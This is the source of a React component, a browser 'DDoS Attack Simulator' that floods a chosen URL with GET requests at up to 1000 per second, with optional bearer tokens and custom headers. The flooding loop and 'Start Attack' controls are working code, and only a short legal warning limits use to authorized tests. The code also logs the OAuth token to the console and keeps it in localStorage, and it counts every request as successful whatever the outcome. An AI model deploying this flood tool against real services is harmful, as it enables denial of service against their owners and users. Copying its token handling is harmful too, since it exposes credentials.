import React, { useState, useEffect } from 'react';

const DDOS_SIMULATOR_STORAGE_KEY = 'ddosSimulatorConfig';

interface DDoSConfig {
  targetUrl: string;
  oauthToken: string;
  requestsPerSecond: number;
  duration: number;
  customHeaderKey: string;
  customHeaderValue: string;
}

const DDoSSimulator: React.FC = () => {
  const [config, setConfig] = useState<DDoSConfig>(() => {
    const stored = localStorage.getItem(DDOS_SIMULATOR_STORAGE_KEY);
    return stored ? JSON.parse(stored) : {
      targetUrl: '',
      oauthToken: '',
      requestsPerSecond: 10,
      duration: 10,
      customHeaderKey: '',
      customHeaderValue: '',
    };
  });
  
  const [isRunning, setIsRunning] = useState(false);
  const [stats, setStats] = useState({
    sent: 0,
    successful: 0,
    failed: 0,
    elapsed: 0,
  });
  const [logs, setLogs] = useState<string[]>([]);
  const [intervalId, setIntervalId] = useState<number | null>(null);
  const [timeoutId, setTimeoutId] = useState<number | null>(null);
  const [startTime, setStartTime] = useState<number>(0);

  useEffect(() => {
    localStorage.setItem(DDOS_SIMULATOR_STORAGE_KEY, JSON.stringify(config));
  }, [config]);

  const addLog = (message: string) => {
    const timestamp = new Date().toLocaleTimeString();
    setLogs(prev => [`[${timestamp}] ${message}`, ...prev].slice(0, 100));
  };

  const makeRequest = async () => {
    if (!config.targetUrl) {
      return;
    }

    try {
      const headers: HeadersInit = {
        'Content-Type': 'application/json',
      };

      // Add OAuth token if provided
      console.log('OAuth Token config:', config);
      if (config.oauthToken) {
        headers['Authorization'] = `Bearer ${config.oauthToken}`;
      }

      // Add custom header if both key and value are provided
      if (config.customHeaderKey && config.customHeaderValue) {
        headers[config.customHeaderKey] = config.customHeaderValue;
      }

      fetch(config.targetUrl, {
        method: 'GET',
        headers: headers,
      }).catch(() => {});

      setStats(prev => ({
        ...prev,
        sent: prev.sent + 1,
        successful: prev.successful + 1,
      }));
    } catch (error: any) {
      setStats(prev => ({
        ...prev,
        sent: prev.sent + 1,
        failed: prev.failed + 1,
      }));
      addLog(`Request error: ${error.message}`);
    }
  };

  const startAttack = () => {
    if (!config.targetUrl) {
      addLog('Error: Please configure target URL');
      return;
    }

    setIsRunning(true);
    setStats({ sent: 0, successful: 0, failed: 0, elapsed: 0 });
    setLogs([]);
    setStartTime(Date.now());
    addLog(`Starting DDoS simulation: ${config.requestsPerSecond} req/s for ${config.duration}s`);

    const interval = setInterval(() => {
      for (let i = 0; i < config.requestsPerSecond; i++) {
        makeRequest();
      }
    }, 1000);

    setIntervalId(interval);

    // Auto-stop after duration
    const timeout = setTimeout(() => {
      clearInterval(interval);
      setIntervalId(null);
      setTimeoutId(null);
      setIsRunning(false);
      const elapsed = (config.duration).toFixed(2);
      setStats(prev => ({ ...prev, elapsed: parseFloat(elapsed) }));
      addLog(`Attack completed. Total time: ${config.duration}s`);
    }, config.duration * 1000);
    
    setTimeoutId(timeout);
  };

  const stopAttack = () => {
    if (intervalId) {
      clearInterval(intervalId);
      setIntervalId(null);
    }
    if (timeoutId) {
      clearTimeout(timeoutId);
      setTimeoutId(null);
    }
    setIsRunning(false);
    const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
    setStats(prev => ({ ...prev, elapsed: parseFloat(elapsed) }));
    addLog(`Attack stopped manually. Total time: ${elapsed}s`);
  };

  const handleConfigChange = (field: keyof DDoSConfig, value: string | number | boolean) => {
    setConfig(prev => ({ ...prev, [field]: value }));
  };

  const clearLogs = () => {
    setLogs([]);
  };

  return (
    <div className="h-full flex flex-col p-6 md:p-12 overflow-auto">
      <div className="max-w-6xl mx-auto w-full">
        <h2 className="text-4xl font-bold text-center text-slate-900 dark:text-white mb-2">
          DDoS Attack Simulator
        </h2>
        <p className="text-center text-slate-600 dark:text-slate-400 mb-8 text-sm">
          ⚠️ Use it at your own risk
        </p>

        {/* Configuration Panel */}
        <div className="bg-white dark:bg-slate-800 rounded-lg border border-slate-300 dark:border-slate-600 p-6 mb-6">
          <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-4">Configuration</h3>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="md:col-span-2">
              <label className="block text-sm font-medium text-slate-700 dark:text-slate-300 mb-2">
                Target URL
              </label>
              <input
                type="text"
                value={config.targetUrl}
                onChange={(e) => handleConfigChange('targetUrl', e.target.value)}
                placeholder="https://api.vyshak.ml/endpoint"
                disabled={isRunning}
                className="w-full px-3 py-2 bg-white dark:bg-slate-700 border border-slate-300 dark:border-slate-600 rounded-md focus:ring-2 focus:ring-sky-500 focus:border-sky-500 disabled:opacity-50 disabled:cursor-not-allowed transition"
              />
            </div>

            <div className="md:col-span-2">
              <label className="block text-sm font-medium text-slate-700 dark:text-slate-300 mb-2">
                OAuth Token (Optional)
              </label>
              <input
                type="password"
                value={config.oauthToken}
                onChange={(e) => handleConfigChange('oauthToken', e.target.value)}
                placeholder="Enter your OAuth bearer token"
                disabled={isRunning}
                className="w-full px-3 py-2 bg-white dark:bg-slate-700 border border-slate-300 dark:border-slate-600 rounded-md focus:ring-2 focus:ring-sky-500 focus:border-sky-500 disabled:opacity-50 disabled:cursor-not-allowed transition"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-slate-700 dark:text-slate-300 mb-2">
                Custom Header Key (Optional)
              </label>
              <input
                type="text"
                value={config.customHeaderKey}
                onChange={(e) => handleConfigChange('customHeaderKey', e.target.value)}
                placeholder="e.g., X-API-Key"
                disabled={isRunning}
                className="w-full px-3 py-2 bg-white dark:bg-slate-700 border border-slate-300 dark:border-slate-600 rounded-md focus:ring-2 focus:ring-sky-500 focus:border-sky-500 disabled:opacity-50 disabled:cursor-not-allowed transition"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-slate-700 dark:text-slate-300 mb-2">
                Custom Header Value (Optional)
              </label>
              <input
                type="text"
                value={config.customHeaderValue}
                onChange={(e) => handleConfigChange('customHeaderValue', e.target.value)}
                placeholder="Header value"
                disabled={isRunning}
                className="w-full px-3 py-2 bg-white dark:bg-slate-700 border border-slate-300 dark:border-slate-600 rounded-md focus:ring-2 focus:ring-sky-500 focus:border-sky-500 disabled:opacity-50 disabled:cursor-not-allowed transition"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-slate-700 dark:text-slate-300 mb-2">
                Requests per Second
              </label>
              <input
                type="number"
                value={config.requestsPerSecond}
                onChange={(e) => handleConfigChange('requestsPerSecond', parseInt(e.target.value) || 1)}
                min="1"
                max="1000"
                disabled={isRunning}
                className="w-full px-3 py-2 bg-white dark:bg-slate-700 border border-slate-300 dark:border-slate-600 rounded-md focus:ring-2 focus:ring-sky-500 focus:border-sky-500 disabled:opacity-50 disabled:cursor-not-allowed transition"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-slate-700 dark:text-slate-300 mb-2">
                Duration (seconds)
              </label>
              <input
                type="number"
                value={config.duration}
                onChange={(e) => handleConfigChange('duration', parseInt(e.target.value) || 1)}
                min="1"
                max="300"
                disabled={isRunning}
                className="w-full px-3 py-2 bg-white dark:bg-slate-700 border border-slate-300 dark:border-slate-600 rounded-md focus:ring-2 focus:ring-sky-500 focus:border-sky-500 disabled:opacity-50 disabled:cursor-not-allowed transition"
              />
            </div>
          </div>

          <div className="mt-4 flex gap-4">
            <button
              onClick={startAttack}
              disabled={isRunning || !config.targetUrl}
              className="px-6 py-2 font-semibold text-white bg-red-500 rounded-md hover:bg-red-600 disabled:bg-slate-400 dark:disabled:bg-slate-600 disabled:cursor-not-allowed transition"
            >
              {isRunning ? 'Attack Running...' : 'Start Attack'}
            </button>
            <button
              onClick={stopAttack}
              disabled={!isRunning}
              className="px-6 py-2 font-semibold text-white bg-orange-500 rounded-md hover:bg-orange-600 disabled:bg-slate-400 dark:disabled:bg-slate-600 disabled:cursor-not-allowed transition"
            >
              Stop Attack
            </button>
          </div>
        </div>

        {/* Statistics Panel */}
        <div className="bg-white dark:bg-slate-800 rounded-lg border border-slate-300 dark:border-slate-600 p-6 mb-6">
          <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-4">Statistics</h3>
          
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            <div className="text-center">
              <div className="text-3xl font-bold text-sky-500 dark:text-sky-400">{stats.sent}</div>
              <div className="text-sm text-slate-600 dark:text-slate-400">Requests Sent</div>
            </div>
            <div className="text-center">
              <div className="text-3xl font-bold text-green-500 dark:text-green-400">{stats.successful}</div>
              <div className="text-sm text-slate-600 dark:text-slate-400">Successful</div>
            </div>
            <div className="text-center">
              <div className="text-3xl font-bold text-red-500 dark:text-red-400">{stats.failed}</div>
              <div className="text-sm text-slate-600 dark:text-slate-400">Failed</div>
            </div>
            <div className="text-center">
              <div className="text-3xl font-bold text-purple-500 dark:text-purple-400">{stats.elapsed}s</div>
              <div className="text-sm text-slate-600 dark:text-slate-400">Elapsed Time</div>
            </div>
          </div>

          {stats.sent > 0 && (
            <div className="mt-4 text-sm text-slate-600 dark:text-slate-400">
              <div>Success Rate: {((stats.successful / stats.sent) * 100).toFixed(2)}%</div>
              {stats.elapsed > 0 && (
                <div>Average RPS: {(stats.sent / stats.elapsed).toFixed(2)}</div>
              )}
            </div>
          )}
        </div>

        {/* Logs Panel */}
        <div className="bg-white dark:bg-slate-800 rounded-lg border border-slate-300 dark:border-slate-600 p-6">
          <div className="flex justify-between items-center mb-4">
            <h3 className="text-xl font-semibold text-slate-900 dark:text-white">Activity Logs</h3>
            <button
              onClick={clearLogs}
              className="px-3 py-1 text-xs font-semibold text-white bg-slate-500 rounded-md hover:bg-slate-600 transition"
            >
              Clear Logs
            </button>
          </div>
          
          <div className="bg-slate-900 dark:bg-slate-950 rounded-md p-4 h-64 overflow-y-auto font-mono text-xs">
            {logs.length === 0 ? (
              <div className="text-slate-500">No activity yet...</div>
            ) : (
              logs.map((log, index) => (
                <div key={index} className="text-green-400 mb-1">
                  {log}
                </div>
              ))
            )}
          </div>
        </div>

        {/* Warning Notice */}
        <div className="mt-6 bg-yellow-50 dark:bg-yellow-900/20 border border-yellow-200 dark:border-yellow-800 rounded-lg p-4">
          <p className="text-sm text-yellow-800 dark:text-yellow-200">
            <strong>⚠️ Legal Warning:</strong> This tool is designed for authorized security testing only. 
            Ensure you have explicit permission to test the target system. Unauthorized use may violate laws 
            including the Computer Fraud and Abuse Act (CFAA) and similar legislation worldwide.
          </p>
        </div>
      </div>
    </div>
  );
};

export default DDoSSimulator;
